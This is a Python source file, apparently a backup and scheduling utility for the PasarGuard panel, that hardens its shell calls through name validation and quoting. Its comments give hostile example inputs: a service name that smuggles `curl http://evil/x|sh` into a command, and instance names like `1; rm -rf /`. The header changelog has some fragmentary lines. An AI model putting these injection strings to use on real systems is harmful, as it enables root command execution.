#!/usr/bin/env python3
# ============================================================
#   idontPG-backup  v5.9.8
#   Dev by: durwinam
#   GitHub: https://github.com/durwinam/idontPG-backup
# #          (not just the legacy "pasarguard" database).
#   v4.1 — full compatibility with the official PasarGuard panel
#          (https://github.com/PasarGuard/panel): detects and handles all
#          five supported backends — sqlite, postgresql, timescaledb, mysql,
#          mariadb — including single-file sqlite backups, mysqldump for
#          MySQL/MariaDB, and per-database pg_dump for PostgreSQL/TimescaleDB.
#   v4.2 — security & bugfix pass:
##            was interpolated unquoted into a shell=True command)
##            into the container via `docker compose exec -e`, not set on the
#            host process (which docker compose does not forward)
#          * bot token / chat id no longer passed as plaintext CLI args
#            (leaked via `ps`/`/proc/<pid>/cmdline` and world-readable
#            systemd unit files) — now written to a 0600 credentials file
#          * passwords are now read with getpass (no terminal echo)
#          * backup archives are chmod 600 on disk (they contain .env
#            secrets)
#          * SSH host-key auto-accept now prints an explicit warning
#          * Telegram Bot API's 50 MB per-file limit is fully handled:
#            oversized backups are transparently split into numbered
###            completeness, and rejoined into the original archive before
#            extraction — no manual `cat` needed.
#          * "Manage Backup Schedulers" can now restart an instance so it
#            picks up the latest script code without deleting and
#            recreating it, and can update a running scheduler's bot
#            token / admin chat ID in place.
#   v4.2.4 — 'manifest.tsv not found or empty' fail-fast pass:
#          * new archive backup with no usable manifest.tsv is now caught
#            LOCALLY right after it's created — in both Auto Transfer and
##            stopped or directories wiped. Previously this failure was only
#            discovered after a full upload + destination wipe + container
#            restart, leaving the destination stopped with nothing to
##          * _read_manifest_remote now retries the remote file check once
#            after a short delay instead of failing on the first miss.
#          * when the manifest genuinely is missing on the remote,
#            diagnostics now include a `find -maxdepth 2` of the whole
#            Pasarguard directory, not just the (possibly nonexistent)
#            db_dump/ subfolder — so it's clear whether extraction landed
#            somewhere unexpected or didn't happen at all.
#   v4.2.1 — security hardening pass:
#          * `/tmp` backup staging dir replaced with tempfile.mkdtemp
#            (0700) so the unencrypted .env + DB dump isn't world-readable
#            mid-backup
#          * `curl | sudo bash` auto-update replaced with a
#            download-to-temp / verify-sha256 / then-exec flow (a
#            compromised raw.githubusercontent.com payload no longer
#            gets piped straight into a root shell on confirm)
#          * strict instance-name validator ([A-Za-z0-9_-]+) used by every
#            function that builds a filesystem path, systemd unit name,
#            screen/tmux session name, or shell=True command from user
#            input — closes the path-traversal in /etc/pasarguard-backup
#            that v4.2 introduced, plus the unit/session name injection
#            in `Manage Backup Schedulers`. shlex.quote() added to the
#            same shell=True spots as defence-in-depth
##            /var/lib/pasarguard/ so a malicious backup's
#            SQLALCHEMY_DATABASE_URL can't redirect cp to /etc/cron.d etc.
#          * manifest.sql_file is rejected if it contains `..`, `/`, or
## ============================================================

import os, sys, subprocess, datetime, shutil, re, tempfile, hashlib, zipfile
import time, urllib.request, urllib.error, uuid, threading, itertools
import argparse, shlex, socket, getpass, json, stat

VERSION = "5.9.8"

# ── ANSI Colors ──────────────────────────────────────────────
# Three red tones for hierarchy:
#   R1  bright red  — active labels, prompts, highlights
#   R2  mid red     — secondary info, borders, dividers
#   R3  dark red    — dim text, decorations
#   WH  white       — message body text (keeps readability)
#   BLD bold
#   DIM dim
class C:
    RESET = "\033[0m"
    BOLD  = "\033[1m"
    DIM   = "\033[2m"
    R1    = "\033[38;2;255;80;80m"    # bright red  — titles, selections
    R2    = "\033[38;2;200;50;50m"    # mid red     — labels, borders
    R3    = "\033[38;2;120;20;20m"    # dark red    — dim / decorative
    WH    = "\033[97m"                # white       — readable body text

def clr():
    os.system("clear")

def tw():
    try: return os.get_terminal_size().columns
    except: return 80

def hline(ch="─"):
    return C.R3 + ch * tw() + C.RESET

def center(s, raw_len=None):
    l = raw_len if raw_len is not None else len(s)
    pad = max(0, (tw() - l) // 2)
    return " " * pad + s

# ── Status helpers ───────────────────────────────────────────
def ok(msg):   print(f"  {C.R1}+{C.RESET}  {C.WH}{msg}{C.RESET}")
def err(msg):  print(f"  {C.R1}x{C.RESET}  {C.WH}{msg}{C.RESET}")
def info(msg): print(f"  {C.R2}>{C.RESET}  {C.WH}{msg}{C.RESET}")
def warn(msg): print(f"  {C.R1}!{C.RESET}  {C.WH}{msg}{C.RESET}")

def print_success(msg): print(f"  {C.R1}[OK]{C.RESET}   {C.WH}{msg}{C.RESET}")
def print_error(msg):   print(f"  {C.R1}[ERR]{C.RESET}  {C.WH}{msg}{C.RESET}")
def print_info(msg):    print(f"  {C.R2}[..]{C.RESET}   {C.WH}{msg}{C.RESET}")
def print_warning(msg): print(f"  {C.R1}[!!]{C.RESET}   {C.WH}{msg}{C.RESET}")

def pause_and_return():
    input(f"\n  {C.R2}Press ENTER to return to the main menu...{C.RESET}")

# ── Spinner ──────────────────────────────────────────────────
class Spinner:
    def __init__(self, message="Processing..."):
        self.cycle  = itertools.cycle(['-', '\\', '|', '/'])
        self.stop   = threading.Event()
        self.msg    = message
        self.thread = threading.Thread(target=self._spin)

    def _spin(self):
        while not self.stop.is_set():
            sys.stdout.write(f"\r  {C.R2}{next(self.cycle)}{C.RESET}  {C.WH}{self.msg}{C.RESET}")
            sys.stdout.flush()
            time.sleep(0.1)
        sys.stdout.write('\r' + ' ' * (len(self.msg) + 15) + '\r')
        sys.stdout.flush()

    def __enter__(self):
        self.thread.start()
        return self

    def __exit__(self, *_):
        self.stop.set()
        self.thread.join()

# ── Auto-install paramiko ────────────────────────────────────
# Skip this when running as the headless daemon child (spawned by screen /
# tmux / systemd) so the persistence layer doesn't repeat the apt/pip dance.
if "--daemon-backup" not in sys.argv:
    try:
        import paramiko
    except ImportError:
        print(f"  {C.R2}[..]{C.RESET}  {C.WH}Required libraries not found. Installing...{C.RESET}")
        with Spinner("Installing Paramiko... Please wait"):
            try:
                subprocess.check_call(["apt-get", "update"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                subprocess.check_call(["apt-get", "install", "-y", "python3-paramiko", "python3-pip", "unzip"],
                                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except Exception:
                subprocess.check_call([sys.executable, "-m", "pip", "install", "paramiko", "--quiet"],
                                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        import paramiko
        print(f"  {C.R1}[OK]{C.RESET}  {C.WH}Libraries installed successfully!{C.RESET}\n")

# ── Auto-install PySocks (needed for SOCKS4/5 proxy support) ──
# Unlike paramiko, this one is NOT skipped for the daemon child, since the
# scheduled backup loop itself may need to reach Telegram through a SOCKS proxy.
try:
    import socks as _pysocks
except ImportError:
    if "--daemon-backup" not in sys.argv:
        print(f"  {C.R2}[..]{C.RESET}  {C.WH}Installing PySocks (SOCKS proxy support)...{C.RESET}")
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pysocks", "--quiet"],
                              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        pass
    try:
        import socks as _pysocks
    except ImportError:
        _pysocks = None

# ── Paths ────────────────────────────────────────────────────
PASARGUARD_DIR      = "/opt/pasarguard"
PG_NODE_DIR         = "/opt/pg-node"
PASARGUARD_DATA_DIR = "/var/lib/pasarguard"
PG_NODE_DATA_DIR    = "/var/lib/pg-node"

COMPOSE_DOWN_TIMEOUT    = 30
POSTGRES_READY_MAX_WAIT = 120
POSTGRES_READY_INTERVAL = 2
COMPOSE_UP_MAX_WAIT     = 120
COMPOSE_UP_INTERVAL     = 3
COMPOSE_STOP_RETRIES    = 3

SCREEN_SESSION_BASE    = "pasarguard_backup"
TMUX_SESSION_BASE      = "pasarguard_backup"
SYSTEMD_SERVICE_BASE   = "pasarguard-backup"
SYSTEMD_UNIT_DIR       = "/etc/systemd/system"

# v4.2 — credentials directory for scheduler daemons. Files here hold the
# bot token / chat id / proxy for a given scheduler instance instead of
# passing them as CLI arguments (which leak via `ps`, /proc/<pid>/cmdline,
# and world-readable systemd unit files). Each file is chmod 600.
CREDS_DIR = "/etc/pasarguard-backup"

# v4.2.1 — strict validator for instance/file names that get embedded into
# filesystem paths, systemd unit names, screen/tmux session names, or
# shell=True commands. Anything outside [A-Za-z0-9_-]+ is rejected. Defence
# in depth — the user (running as root) is already trusted, but a single
# `../` or `; rm -rf /` slipping through here becomes a path-traversal
# RCE elsewhere. The two existing places this used to land unsafely are
# _creds_path() (writes/reads /etc/pasarguard-backup/<name>.json) and
# ask_instance_name() (returns the suffix used in unit/session names).
_INSTANCE_NAME_RE = re.compile(r"^[A-Za-z0-9_-]+$")

def _validate_instance_name(name, *, allow_empty=False):
    if not name:
        if allow_empty:
            return ""
        raise ValueError("empty name")
    if not _INSTANCE_NAME_RE.match(name):
        raise ValueError(
            f"invalid name {name!r} — only letters, digits, '_' and '-' are allowed"
        )
    return name

def _creds_path(instance):
    safe = instance or "default"
    # v4.2.1 — refuse anything that could escape CREDS_DIR before we
    # touch the filesystem. _validate_instance_name raises ValueError on
    # a bad name; callers (write_daemon_creds / read_daemon_creds /
    # read_daemon_meta / run_daemon_from_args) propagate that.
    _validate_instance_name(safe)
    return os.path.join(CREDS_DIR, f"{safe}.json")

# v4.2.1 — validator for docker compose service names. `svc` is extracted
# from docker-compose.yml / `docker compose config` output and then
# interpolated (without quoting, until this fix) into shell=True commands
# like `docker compose exec -T {shlex.quote(svc)} ...`. A malicious or tampered compose
# file with a service named, say, `timescaledb; curl http://evil/x|sh`,
# would then inject arbitrary commands as root. Defence in depth: the
# service name is validated at extraction AND shlex.quote() is applied at
# every shell-use site below.
_SAFE_SERVICE_NAME_RE = re.compile(r"^[A-Za-z0-9_.-]+$")

def _validate_service_name(svc, *, allow_empty=False):
    if not svc:
        if allow_empty:
            return ""
        raise ValueError("empty service name")
    if not _SAFE_SERVICE_NAME_RE.match(svc):
        raise ValueError(
            f"unsafe docker service name {svc!r} — only letters, digits, '_', '.', '-' are allowed"
        )
    return svc

def write_daemon_creds(instance, bot_token, admin_id, proxy=None, interval_h=None, include_node=None):
    """Persist everything a scheduler instance needs to run: token, chat id,
    proxy, interval, and scope. Storing interval/include_node here (not just
    token/chat) means 'Manage Backup Schedulers' can fully reconstruct the
    daemon command later — to restart a screen/tmux session with the exact
    same settings, or to push an updated token/chat id — without asking the
    user to re-enter everything from scratch. Merges with any existing file
    so partial updates (e.g. token-only) don't wipe out other fields."""
    os.makedirs(CREDS_DIR, exist_ok=True)
    try:
        os.chmod(CREDS_DIR, 0o700)
    except Exception:
        pass
    path = _creds_path(instance)
    existing = {}
    if os.path.exists(path):
        try:
            with open(path) as f:
                existing = json.load(f)
        except Exception:
            existing = {}
    data = {
        "token":    bot_token if bot_token is not None else existing.get("token", ""),
        "chat":     admin_id if admin_id is not None else existing.get("chat", ""),
        "proxy":    (proxy if proxy is not None else existing.get("proxy", "")) or "",
        "interval": interval_h if interval_h is not None else existing.get("interval", 1.0),
        "node":     include_node if include_node is not None else existing.get("node", False),
    }
    fd = os.open(path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
    with os.fdopen(fd, "w") as f:
        json.dump(data, f)
    os.chmod(path, 0o600)
    return path

def read_daemon_creds(instance):
    path = _creds_path(instance)
    with open(path) as f:
        data = json.load(f)
    return data.get("token", ""), data.get("chat", ""), (data.get("proxy") or None)

def read_daemon_meta(instance):
    """Full stored config for a scheduler instance (token/chat/proxy/interval/
    node), or None if no credentials file exists for it. Used by 'Manage
    Backup Schedulers' to rebuild the exact daemon command for a restart."""
    path = _creds_path(instance)
    if not os.path.exists(path):
        return None
    try:
        with open(path) as f:
            data = json.load(f)
    except Exception:
        return None
    return {
        "token":    data.get("token", ""),
        "chat":     data.get("chat", ""),
        "proxy":    data.get("proxy") or None,
        "interval": data.get("interval", 1.0),
        "node":     bool(data.get("node", False)),
    }

def _migrate_legacy_systemd_instance(name):
    """One-time upgrade path for a systemd scheduler that was created by a
    pre-v4.2 version of this script, where --token/--chat/--interval/--node
    were baked in plaintext inside ExecStart= (world-readable, and visible
    in `ps`). Reads the old unit file, pulls the values back out, writes
    them into the new 0600 credentials file, and rewrites ExecStart to the
    new token-free form — so 'Restart' / 'Update Bot Token' work on it going
    forward exactly like a scheduler created fresh in v4.2.

    Returns the migrated meta dict on success, or None if the unit file
    can't be found/parsed (e.g. it's already using the new format, or it's
    not a scheduler this script created)."""
    unit_path = f"{SYSTEMD_UNIT_DIR}/{name}.service"
    if not os.path.exists(unit_path):
        return None
    try:
        with open(unit_path) as f:
            unit_text = f.read()
    except Exception:
        return None

    exec_line = None
    for line in unit_text.splitlines():
        if line.strip().startswith("ExecStart="):
            exec_line = line.strip()[len("ExecStart="):]
            break
    if not exec_line:
        return None

    try:
        argv = shlex.split(exec_line)
    except ValueError:
        return None

    token = chat = proxy = None
    interval = 1.0
    include_node = False
    i = 0
    while i < len(argv):
        a = argv[i]
        if a == "--token" and i + 1 < len(argv):
            token = argv[i + 1]; i += 2; continue
        if a == "--chat" and i + 1 < len(argv):
            chat = argv[i + 1]; i += 2; continue
        if a == "--proxy" and i + 1 < len(argv):
            proxy = argv[i + 1]; i += 2; continue
        if a == "--interval" and i + 1 < len(argv):
            try:
                interval = float(argv[i + 1])
            except ValueError:
                pass
            i += 2; continue
        if a == "--node":
            include_node = True; i += 1; continue
        i += 1

    if not token or not chat:
        # Nothing usable to migrate (already new-format, or a foreign unit).
        return None

    print_info(f"Migrating '{name}' from the old plaintext-credentials format to the secure 0600 store...")
    write_daemon_creds(name, token, chat, proxy, interval_h=interval, include_node=include_node)

    # Rewrite ExecStart to the new token-free invocation and lock the unit
    # file down, same as launch_via_systemd does for freshly created ones.
    new_daemon_cmd = build_daemon_command(interval, include_node, instance=name)
    new_unit_text = "\n".join(
        (f"ExecStart={new_daemon_cmd}" if line.strip().startswith("ExecStart=") else line)
        for line in unit_text.splitlines()
    ) + "\n"
    try:
        with open(unit_path, "w") as f:
            f.write(new_unit_text)
        os.chmod(unit_path, 0o600)
        run_command("systemctl daemon-reload", quiet=True)
    except Exception as e:
        print_warning(f"Credentials were migrated, but updating the unit file failed: {e}")
        print_warning("The old token may still be readable in the unit file — consider removing")
        print_warning("and recreating this scheduler instance instead.")

    print_success(f"'{name}' migrated — credentials are now stored in {_creds_path(name)} (mode 600).")
    return read_daemon_meta(name)

# Per-instance status files so the "Manage Backup Schedulers" menu can show
# whether an instance is currently backing up or sleeping until its next run,
# instead of just a raw process-alive check.
# v4.2.1 — state lives under the same /etc/pasarguard-backup tree (0700,
# root-owned) instead of /tmp. Even though state files don't carry secrets,
# a local attacker who could write to /tmp/<...>.state could trick the
# "Manage Backup Schedulers" menu into showing the wrong status.
STATE_DIR = os.path.join(CREDS_DIR, "state")
_STATE_DIR_READY = False

def _ensure_state_dir():
    global _STATE_DIR_READY
    if _STATE_DIR_READY:
        return True
    try:
        os.makedirs(STATE_DIR, mode=0o700, exist_ok=True)
        # CREDS_DIR itself is also 0700 from write_daemon_creds, but
        # belt-and-braces in case the state dir was created before that.
        os.chmod(STATE_DIR, 0o700)
        _STATE_DIR_READY = True
        return True
    except Exception:
        return False

def _state_file(instance):
    return os.path.join(STATE_DIR, f"{instance}.state")

def write_state(instance, phase, extra=""):
    if not instance:
        return
    if not _ensure_state_dir():
        return
    try:
        path = _state_file(instance)
        fd = os.open(path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
        with os.fdopen(fd, "w") as f:
            f.write(f"{phase}|{extra}|{time.time()}")
    except Exception:
        pass

def read_state(instance):
    """Returns (phase, extra, age_seconds) or None."""
    try:
        with open(_state_file(instance)) as f:
            phase, extra, ts = f.read().split("|", 2)
        return phase, extra, time.time() - float(ts)
    except Exception:
        return None

# ── Logo / Header ────────────────────────────────────────────
# v5.5.3 — large IDONT terminal branding.
# Kept dependency-free so the CLI works on a clean server.
LOGO = [
    "██╗██████╗  ██████╗ ███╗   ██╗████████╗",
    "██║██╔══██╗██╔═══██╗████╗  ██║╚══██╔══╝",
    "██║██║  ██║██║   ██║██╔██╗ ██║   ██║   ",
    "██║██║  ██║██║   ██║██║╚██╗██║   ██║   ",
    "██║██████╔╝╚██████╔╝██║ ╚████║   ██║   ",
    "╚═╝╚═════╝  ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ",
]
LOGO_W = max(len(line) for line in LOGO)


def _get_web_panel_info():
    """Return the Web Panel URL. The Web Panel is HTTP-only on port 5000."""
    configured = os.environ.get("IDONT_PG_WEB_URL", "").strip().rstrip("/")
    if configured:
        configured = re.sub(r"^https://", "http://", configured, flags=re.IGNORECASE)
        return {"url": configured, "scheme": "http", "cert": "", "key": ""}

    try:
        with urllib.request.urlopen("https://api.ipify.org", timeout=2) as r:
            ip = r.read().decode("ascii", "ignore").strip()
            if re.match(r"^[0-9]{1,3}(?:\.[0-9]{1,3}){3}$", ip):
                return {"url": f"http://{ip}:5000", "scheme": "http", "cert": "", "key": ""}
    except Exception:
        pass

    try:
        out = subprocess.check_output(["hostname", "-I"], text=True, timeout=1)
        for item in out.split():
            if "." in item and not item.startswith(("127.", "10.", "192.168.")):
                return {"url": f"http://{item}:5000", "scheme": "http", "cert": "", "key": ""}
    except Exception:
        pass
    return {"url": "http://127.0.0.1:5000", "scheme": "http", "cert": "", "key": ""}

def _get_web_panel_url():
    """Return a usable Web Panel URL without adding dependencies."""
    return _get_web_panel_info()["url"]


def print_header(title=""):
    clr()
    print()
    for line in LOGO:
        print(center(C.R1 + C.BOLD + line + C.RESET, LOGO_W))
    sub = C.R3 + C.BOLD + f"B A C K U P   U T I L I T Y   v {VERSION.replace('.', ' . ')}   -   d u r w i n a m" + C.RESET
    print(center(sub, 57))
    print()
    print(hline())
    if title:
        print()
        print(center(C.R1 + C.BOLD + title + C.RESET, min(len(title), 50)))
    print()

# ── Shell helpers ─────────────────────────────────────────────
def local_shell(command, cwd=None):
    try:
        r = subprocess.run(command, shell=True, cwd=cwd, capture_output=True, text=True)
        return r.returncode == 0, r.stdout.strip(), r.stderr.strip()
    except Exception as e:
        return False, "", str(e)

def run_command(cmd, output_file=None, cwd=None, quiet=True):
    try:
        if output_file:
            with open(output_file, "w") as f:
                subprocess.run(cmd, shell=True, check=True, stdout=f, stderr=subprocess.PIPE, cwd=cwd)
        else:
            stdout_t = subprocess.DEVNULL if quiet else None
            subprocess.run(cmd, shell=True, check=True, stdout=stdout_t, stderr=subprocess.PIPE, cwd=cwd)
        return True
    except subprocess.CalledProcessError as e:
        print_error(f"Command failed: {cmd}")
        if e.stderr:
            print_error(f"Details: {e.stderr.decode('utf-8').strip()}")
        return False

def ssh_shell(ssh, command):
    stdin, stdout, stderr = ssh.exec_command(command)
    exit_status = stdout.channel.recv_exit_status()
    return exit_status, stdout.read().decode().strip(), stderr.read().decode().strip()

def execute_ssh_command(ssh, command, description, required=True):
    print(f"  {C.R2}[SSH]{C.RESET}  {C.WH}{description}...{C.RESET}")
    exit_status, out, er = ssh_shell(ssh, command)
    if exit_status == 0:
        ok("Done.")
    else:
        err_msg = er or out
        print_error("Command failed!")
        if err_msg:
            print_error(f"Details: {err_msg}")
    return exit_status == 0 if required else True

# ── Persistence helpers (screen / tmux / systemd) ─────────────
def ensure_tool_installed(binary, pkg=None):
    """Make sure a local CLI tool (screen/tmux) is available, installing it via apt if missing."""
    pkg = pkg or binary
    if shutil.which(binary):
        return True
    print_info(f"'{binary}' not found. Installing '{pkg}'...")
    with Spinner(f"Installing {pkg}..."):
        run_command("apt-get update", quiet=True)
        run_command(f"apt-get install -y {pkg}", quiet=True)
    if shutil.which(binary):
        print_success(f"'{pkg}' installed.")
        return True
    print_error(f"Failed to install '{pkg}'. Please install it manually and try again.")
    return False

def build_daemon_command(interval_h, include_node, instance=None):
    """Builds the exact CLI invocation used to re-run this same script
    headlessly. v4.2: the bot token / chat id / proxy are NOT passed here
    any more — they're written to a 0600 credentials file (see
    write_daemon_creds) and the daemon reads them back by --instance name,
    so they never appear in `ps`, /proc/<pid>/cmdline, or a systemd unit
    file (which is world-readable by default)."""
    script_path = os.path.abspath(__file__)
    parts = [
        sys.executable, script_path, "--daemon-backup",
        "--interval", str(interval_h),
        "--instance", instance or "default",
    ]
    if include_node:
        parts.append("--node")
    return " ".join(shlex.quote(p) for p in parts)

def systemd_unit_name(suffix):
    return f"{SYSTEMD_SERVICE_BASE}-{suffix}"

def systemd_unit_path(suffix):
    return f"{SYSTEMD_UNIT_DIR}/{systemd_unit_name(suffix)}.service"

def list_systemd_backup_units():
    """Return [(suffix, unit_name, active_bool), ...] for every installed
    pasarguard-backup-* systemd service (so multiple schedulers can coexist)."""
    if shutil.which("systemctl") is None:
        return []
    ok_v, out, _ = local_shell(
        f"systemctl list-units --all --type=service --no-legend --plain '{SYSTEMD_SERVICE_BASE}-*.service' 2>/dev/null")
    units = []
    if ok_v and out:
        for line in out.splitlines():
            parts = line.split()
            if not parts:
                continue
            unit = parts[0]
            if not unit.endswith(".service"):
                continue
            name = unit[:-len(".service")]
            if not name.startswith(SYSTEMD_SERVICE_BASE + "-"):
                continue
            suffix = name[len(SYSTEMD_SERVICE_BASE) + 1:]
            # columns are: UNIT LOAD ACTIVE SUB DESCRIPTION...
            active = len(parts) > 3 and parts[2] == "active" and parts[3] in ("running", "start-pre", "start")
            units.append((suffix, name, active))
    return units

def list_screen_sessions():
    ok_v, out, _ = local_shell("screen -list 2>/dev/null")
    names = []
    if ok_v and out:
        import re
        for line in out.splitlines():
            m = re.search(r"[0-9]+\.(" + re.escape(SCREEN_SESSION_BASE) + r"(?:-[^\s]+)?)", line)
            if m:
                names.append(m.group(1))
    return names

def list_tmux_sessions():
    ok_v, out, _ = local_shell("tmux list-sessions -F '#{session_name}' 2>/dev/null")
    names = []
    if ok_v and out:
        for line in out.splitlines():
            line = line.strip()
            if line.startswith(TMUX_SESSION_BASE):
                names.append(line)
    return names

def next_free_suffix(existing_names, base):
    """Given a list of full names like 'pasarguard-backup-2', find the
    lowest free numeric suffix (1, 2, 3, ...) not already taken."""
    taken = set()
    for n in existing_names:
        if n.startswith(base + "-"):
            taken.add(n[len(base) + 1:])
        elif n == base:
            taken.add("")
    i = 1
    while str(i) in taken:
        i += 1
    return str(i)

def ask_instance_name(kind):
    """Ask the user for a name/suffix for a new scheduler instance so several
    can run side by side (e.g. pasarguard-backup-1, pasarguard-backup-2)
    without clashing. Shows what already exists and lets the user rename
    to avoid collisions.

    v4.2.1 — the user-supplied suffix is strictly validated (only
    [A-Za-z0-9_-]+). Without this, a name such as `1; rm -rf /` would
    ride through into the systemd unit file, the screen/tmux session
    name, the credentials-file path, and every shell=True command below,
    becoming a one-line root RCE the moment the user creates a scheduler."""
    if kind == "systemd":
        base = SYSTEMD_SERVICE_BASE
        existing_full = [name for _, name, _ in list_systemd_backup_units()]
    elif kind == "screen":
        base = SCREEN_SESSION_BASE
        existing_full = list_screen_sessions()
    else:
        base = TMUX_SESSION_BASE
        existing_full = list_tmux_sessions()

    if existing_full:
        print_info(f"Existing {kind} schedulers: {', '.join(existing_full)}")

    suggested_suffix = next_free_suffix(existing_full, base)
    suggested_name    = f"{base}-{suggested_suffix}"

    print(f"  {C.R2}Give this scheduler instance a name so it can run alongside others.{C.RESET}")
    while True:
        name = input(f"  {C.R2}> Instance name [{suggested_name}]: {C.RESET}").strip()
        if not name:
            return suggested_name
        full_name = name if name.startswith(base) else f"{base}-{name}"
        # The base prefix is hard-coded (safe); validate only the
        # user-supplied suffix part. This catches shell metachars, `..`,
        # `/`, etc.
        if full_name.startswith(base + "-"):
            suffix = full_name[len(base) + 1:]
        else:
            suffix = full_name[len(base):]
        try:
            _validate_instance_name(suffix)
        except ValueError as e:
            print_error(f"{e} (in the part after '{base}-').")
            continue
        if full_name in existing_full:
            print_error(f"'{full_name}' is already in use — pick another name.")
            continue
        return full_name

def ask_persistence_mode():
    print()
    print(f"  {C.R2}How should the scheduler keep running after this SSH session closes?{C.RESET}")
    print()
    print(f"  {C.R1}1{C.RESET}  {C.R3}-{C.RESET}  {C.WH}None{C.RESET}      {C.R3}(runs in this terminal only; stops when SSH disconnects){C.RESET}")
    print(f"  {C.R1}2{C.RESET}  {C.R3}-{C.RESET}  {C.WH}screen{C.RESET}    {C.R3}(detached 'screen' session on the server){C.RESET}")
    print(f"  {C.R1}3{C.RESET}  {C.R3}-{C.RESET}  {C.WH}tmux{C.RESET}      {C.R3}(detached 'tmux' session on the server){C.RESET}")
    print(f"  {C.R1}4{C.RESET}  {C.R3}-{C.RESET}  {C.WH}systemd{C.RESET}   {C.R3}(background service; survives reboot too){C.RESET}")
    print()
    while True:
        choice = input(f"  {C.R2}> Enter 1, 2, 3 or 4: {C.RESET}").strip()
        if choice in ("1", "2", "3", "4"):
            return choice
        print_error("Invalid choice. Enter 1, 2, 3 or 4.")

def launch_via_screen(daemon_cmd, session_name=None):
    if not ensure_tool_installed("screen"):
        return False
    session_name = session_name or ask_instance_name("screen")
    # v4.2.1 — validate + shlex.quote before any shell=True use.
    _validate_instance_name(session_name)
    q = shlex.quote(session_name)
    exists, _, _ = local_shell(f"screen -list | grep -q '\\.{q}\\b'")
    if exists:
        print_warning(f"A screen session named '{session_name}' already exists.")
        kill_it = input(f"  {C.R2}> Kill it and start a fresh one? (y/n): {C.RESET}").strip().lower()
        if kill_it != "y":
            print_warning("Aborted — leaving the existing session untouched.")
            return False
        run_command(f"screen -S {q} -X quit", quiet=True)
    if not run_command(f"screen -dmS {q} {daemon_cmd}"):
        print_error("Failed to start the screen session.")
        return False
    print_success(f"Scheduler started in detached screen session '{session_name}'.")
    print_info(f"Reattach anytime with:  screen -r {session_name}")
    print_info(f"Stop it with:           screen -S {session_name} -X quit")
    print_info("Tip: use menu option 'Manage Backup Schedulers' to stop/restart/remove it safely.")
    return True

def launch_via_tmux(daemon_cmd, session_name=None):
    if not ensure_tool_installed("tmux"):
        return False
    session_name = session_name or ask_instance_name("tmux")
    # v4.2.1 — validate + shlex.quote before any shell=True use.
    _validate_instance_name(session_name)
    q = shlex.quote(session_name)
    exists, _, _ = local_shell(f"tmux has-session -t {q} 2>/dev/null")
    if exists:
        print_warning(f"A tmux session named '{session_name}' already exists.")
        kill_it = input(f"  {C.R2}> Kill it and start a fresh one? (y/n): {C.RESET}").strip().lower()
        if kill_it != "y":
            print_warning("Aborted — leaving the existing session untouched.")
            return False
        run_command(f"tmux kill-session -t {q}", quiet=True)
    if not run_command(f"tmux new-session -d -s {q} {daemon_cmd}"):
        print_error("Failed to start the tmux session.")
        return False
    print_success(f"Scheduler started in detached tmux session '{session_name}'.")
    print_info(f"Reattach anytime with:  tmux attach -t {session_name}")
    print_info(f"Stop it with:           tmux kill-session -t {session_name}")
    print_info("Tip: use menu option 'Manage Backup Schedulers' to stop/restart/remove it safely.")
    return True

def launch_via_systemd(daemon_cmd, unit_name=None):
    if shutil.which("systemctl") is None:
        print_error("systemctl not found — this server does not appear to use systemd.")
        return False
    if unit_name is None:
        unit_name = ask_instance_name("systemd")
    unit_path = f"{SYSTEMD_UNIT_DIR}/{unit_name}.service"
    unit = (
        "[Unit]\n"
        f"Description=PasarGuard Scheduled Backup ({unit_name})\n"
        "After=network-online.target docker.service\n"
        "Wants=network-online.target\n\n"
        "[Service]\n"
        "Type=simple\n"
        f"ExecStart={daemon_cmd}\n"
        "Restart=always\n"
        "RestartSec=10\n"
        "User=root\n\n"
        "[Install]\n"
        "WantedBy=multi-user.target\n"
    )
    try:
        with open(unit_path, "w") as f:
            f.write(unit)
        # v4.2: unit files are world-readable by default (0644). The daemon
        # command no longer contains secrets (see build_daemon_command), but
        # keep the unit itself tight anyway.
        os.chmod(unit_path, 0o600)
    except Exception as e:
        print_error(f"Could not write unit file: {e}")
        return False

    print_info("Reloading systemd and enabling the service...")
    # v4.2.1 — quote unit_name in shell=True commands. unit_name was
    # already validated by ask_instance_name(), this is defence in depth.
    _validate_instance_name(unit_name)
    q = shlex.quote(unit_name)
    steps = [
        ("systemctl daemon-reload", "daemon-reload"),
        (f"systemctl enable {q}", "enable"),
        (f"systemctl restart {q}", "start"),
    ]
    for cmd, label in steps:
        if not run_command(cmd):
            print_error(f"systemctl {label} failed.")
            return False

    print_success(f"Scheduler installed as systemd service '{unit_name}'.")
    print_info(f"Check status with:  systemctl status {unit_name}")
    print_info(f"Live logs with:     journalctl -u {unit_name} -f")
    print_info(f"Stop it with:       systemctl stop {unit_name}")
    print_info("Tip: use menu option 'Manage Backup Schedulers' to stop/restart/remove it safely,")
    print_info("     and you can install another instance alongside this one (e.g. -2, -3, ...).")
    return True

# ── DB service auto-detection ──────────────────────────────────
# The DB container is not always named "timescaledb" across PasarGuard
# installs/forks — it can be postgres, postgresql, pgsql, db, etc.
# We detect it once (from docker-compose.yml) and cache it for the
# rest of the run instead of assuming a fixed name.
_DB_SERVICE_CACHE = {}

def _detect_db_service_local(d=None, backend_type=None):
    d = d or PASARGUARD_DIR
    if d in _DB_SERVICE_CACHE:
        return _DB_SERVICE_CACHE[d]
    ok_v, out, _ = local_shell("docker compose config --services", cwd=d)
    services = [l.strip() for l in out.splitlines() if l.strip()] if ok_v else []
    svc = _pick_db_service(services, backend_type=backend_type)
    _DB_SERVICE_CACHE[d] = svc
    return svc

def _detect_db_service_ssh(ssh, d=None, backend_type=None):
    d = d or PASARGUARD_DIR
    key = ("ssh", d)
    if key in _DB_SERVICE_CACHE:
        return _DB_SERVICE_CACHE[key]
    ec, out, _ = ssh_shell(ssh, f"cd {d} && docker compose config --services 2>/dev/null")
    services = [l.strip() for l in out.splitlines() if l.strip()] if ec == 0 else []
    svc = _pick_db_service(services, backend_type=backend_type)
    _DB_SERVICE_CACHE[key] = svc
    return svc

# Default DB service name to fall back to when no service list could be
# read. Indexed by backend_type so a mysql-only install gets "mysql" (which
# actually exists), not "timescaledb" (which doesn't, and would cause the
# script to try to docker exec into a non-existent service).
